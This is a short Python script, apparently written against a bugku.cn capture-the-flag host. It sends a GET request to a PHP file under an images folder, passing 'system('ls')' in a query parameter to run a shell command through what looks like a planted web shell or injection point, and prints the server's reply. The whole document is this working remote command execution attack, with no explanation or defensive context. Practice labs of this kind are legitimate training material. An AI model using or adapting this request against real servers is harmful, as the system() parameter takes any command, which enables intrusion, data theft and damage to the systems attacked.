import requests
import json

def shellcode(url):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Host': '192-168-1-11.pvp6356.bugku.cn',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }

    cookies = {}

    data = None

    url = url + '/assets/imgs/config.php?s=system(%27ls%27);'

    response = requests.get(url, headers=headers, cookies=cookies)

    print(f'Status Code: {response.status_code}')
    print(f'Response Headers: {dict(response.headers)}')
    print(f'Response Body: {response.text}')
    return response.text
